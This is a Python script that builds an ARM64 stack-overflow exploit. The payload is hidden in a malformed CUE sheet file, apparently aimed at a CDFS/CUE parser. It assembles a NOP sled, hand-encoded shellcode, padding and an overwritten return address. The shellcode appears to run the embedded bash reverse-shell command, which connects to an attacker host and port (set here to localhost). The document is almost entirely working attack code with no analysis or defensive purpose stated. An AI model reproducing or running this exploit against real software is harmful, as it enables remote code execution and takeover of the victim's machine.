#!/usr/bin/env python3
"""
ALIGNED Reverse Shell Exploit
"""
import struct

print("Creating ALIGNED reverse shell exploit...")

ATTACKER_IP = "127.0.0.1"
ATTACKER_PORT = 4444

command = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\x00".encode()

def encode_movz(reg, imm16):
    return struct.pack('<I', 0xD2800000 | ((imm16 & 0xFFFF) << 5) | reg)

def encode_movk(reg, imm16, shift):
    hw = shift // 16
    return struct.pack('<I', 0xF2800000 | (hw << 21) | ((imm16 & 0xFFFF) << 5) | reg)

# Build shellcode
shellcode = b""
shellcode += encode_movz(0, 0xe368)
shellcode += encode_movk(0, 0xffff, 16)
shellcode += encode_movk(0, 0xffff, 32)
shellcode += encode_movz(30, 0xcec4)
shellcode += encode_movk(30, 0xf7e3, 16)
shellcode += encode_movk(30, 0xffff, 32)
shellcode += bytes([0xc0, 0x03, 0x5f, 0xd6])  # ret

# Pad to 32 bytes total
while len(shellcode) < 32:
    shellcode += bytes([0x1f, 0x20, 0x03, 0xd5])

full_shellcode = shellcode + command

print(f"Shellcode starts with: {shellcode[:8].hex()}")
print(f"Should be movz x0 instruction")

# CRITICAL: Make sure NOPs are 4-byte aligned
nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400  # Exactly 1600 bytes (400 * 4)

# Verify alignment
assert len(nop_sled) == 1600, f"NOP sled is {len(nop_sled)} not 1600!"
assert len(nop_sled) % 4 == 0, "NOP sled not 4-byte aligned!"

payload = nop_sled + full_shellcode
payload = payload.ljust(2144, b"A")
payload += b"\x48\xe3\xff\xff\xff\xff\xff\xff"

print(f"\nNOP sled: {len(nop_sled)} bytes")
print(f"Shellcode at offset: {len(nop_sled)}")
print(f"Total payload before padding: {len(nop_sled + full_shellcode)}")

with open("formats/cdfs/reverse_shell.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

print("\n✓ Aligned exploit created!")
print("\nIn GDB, verify alignment:")
print("  x/4i 0xffffffffe348")
print("  (Should show: movz x0, #0xe368)")
